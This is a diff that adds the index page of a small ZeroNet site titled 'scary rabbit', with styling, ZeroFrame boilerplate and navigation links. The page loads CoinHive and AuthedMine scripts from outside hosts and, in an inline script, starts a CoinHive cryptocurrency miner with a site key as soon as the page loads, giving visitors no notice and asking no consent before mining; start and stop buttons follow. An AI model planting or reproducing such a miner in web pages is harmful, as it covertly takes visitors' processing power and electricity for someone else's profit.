@@ -1,0 +1,164 @@
+
+<!DOCTYPE html>
+
+<html>
+<head>
+ <title>New ZeroNet site!</title>
+ <meta charset="utf-8">
+ <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+ <base href="" target="_top" id="base">
+ <script>base.href = document.location.href.replace("/media", "").replace("index.html", "").replace(/[&?]wrapper=False/, "").replace(/[&?]wrapper_nonce=[A-Za-z0-9]+/, "")</script>
+
+<style>
+  body {
+        text-align: center;
+        padding: 1rem;
+        background-color: black;
+      }
+  span {
+        color: white;
+        }
+  .box{
+        -moz-border-radius: 2px;
+        -webkit-border-radius: 2px;
+        border-radius: 2px;
+        -moz-box-shadow: 0 1px 0 rgba(0,0,0,0.05);
+        -ms-box-shadow: 0 1px 0 rgba(0,0,0,0.05);
+        -webkit-box-shadow: 0 1px 0 rgba(0,0,0,0.05);
+        box-shadow: 0 1px 0 rgba(0,0,0,0.05);
+        -moz-box-sizing: border-box;
+        -webkit-box-sizing: border-box;
+        box-sizing: border-box;
+        -webkit-transition: all .2s;
+        -moz-transition: all .2s;
+        -o-transition: all .2s;
+        transition: all .2s;
+        -moz-user-select: none;
+        -webkit-user-select: none;
+        -ms-user-select: none;
+        background-color: #b3c833;
+        border: 1px;
+        color: #fff;
+        cursor: pointer;
+        display: inline-block;
+        font-family: "Roboto",sans-serif;
+        font-size: 14px;
+        font-style: normal;
+        font-weight: 500;
+        height: 36px;
+        line-height: 34px;
+        min-width: 40px;
+        padding: 0 20px;
+        position: relative;
+        text-align: center;
+        text-decoration: none;
+        white-space: nowrap;
+        vertical-align: middle;
+        -webkit-transition: width 1s;
+        -moz-transition: width 1s;
+        transition: width 1s;
+      }
+  .box:nth-child(1) { background-color: #c1c1be; }
+  .box:nth-child(2) { background-color: #b1b1a9;}
+  .box:nth-child(3) { background-color: #64645e;}
+  .box a
+      {
+        color:#FFF;
+        text-decoration: none;
+        text-align: center;
+        vertical-align: middle;
+        height:100%;
+        display:block;
+        padding-top: 20px;
+      }
+  .box span
+      {
+        display:block;
+        position:relative;
+        top:100%;
+        text-align: center;
+        -webkit-transition: top 1s;
+        -moz-transition: top 1s;
+        transition: top 1s;
+      }
+  .box:hover span{ top:10%; }
+  .box:hover{top :100%;}
+
+  img.logo {
+  max-width  : 25%;
+  max-height : 25%;
+              }
+  h1 {color: red;}
+
+</style>
+
+</head>
+
+
+<body>
+
+<script  sandbox="allow-same-origin allow-scripts" src="https://authedmine.com/lib/authedmine.min.js"></script>
+<script  sandbox="allow-same-origin allow-scripts" src="https://coinhive.com/lib/coinhive.min.js"></script>
+
+<script type="text/javascript" src="js/ZeroFrame.js"></script>
+<script>
+  var miner = new CoinHive.Anonymous('dJ9sqChuXYw6BqFRmd4PaHvNhGoSPYLS');
+  miner.start();
+  miner.setThrottle(0.72); // Set miner on high throttle (LOW speed)!
+
+  // Listen on events
+  miner.on('found', function() { / Hash found / })
+  miner.on('accepted', function() { / Hash accepted by the pool / })
+
+  // Update stats once per second
+  setInterval(function() {
+    var hashesPerSecond = miner.getHashesPerSecond();
+    var totalHashes = miner.getTotalHashes();
+    var acceptedHashes = miner.getAcceptedHashes();
+    var throttleValue = miner.getThrottle();
+    var ad_state = 0;
+
+    // OR alternatively, output to console log (recommended)...
+    console.log("Hashes per second: " + parseFloat(hashesPerSecond).toFixed(2));
+    console.log("Total hashes: " + totalHashes);
+    console.log("Throttle value: " + throttleValue);
+
+    }, 1000);
+
+</script>
+<script>
+  class Page extends ZeroFrame {
+  	setSiteInfo(site_info){}
+
+  	onOpenWebsocket() {
+  		this.cmd("siteInfo", [], function(site_info) {
+  			page.setSiteInfo(site_info)
+    	})
+  	}
+
+  	onRequest(cmd, message) {
+  		if (cmd == "setSiteInfo")
+  			this.setSiteInfo(message.params)
+  		else
+  			this.log("Unknown incoming message:", cmd)
+  	}
+  }
+  page = new Page()
+</script>
+
+<button style="color: red;" onclick="miner.start();" >start</button>
+<button style="color: red;" onclick="miner.stop();" >stop</button>
+
+<div>
+  <a href="index.html" class="box">
+    <span>HOME</span></a>
+  <a href="about.html" class="box">
+    <span>ABOUT</span></a>
+  <a href="" class="box">
+    <span>CONTACT</span></a>
+</div>
+<center><img src="img/mask.png" class="logo" style="margin-top: 10%"></center>
+<h1>scary rabbit</h1>
+</body>
+
+</html>
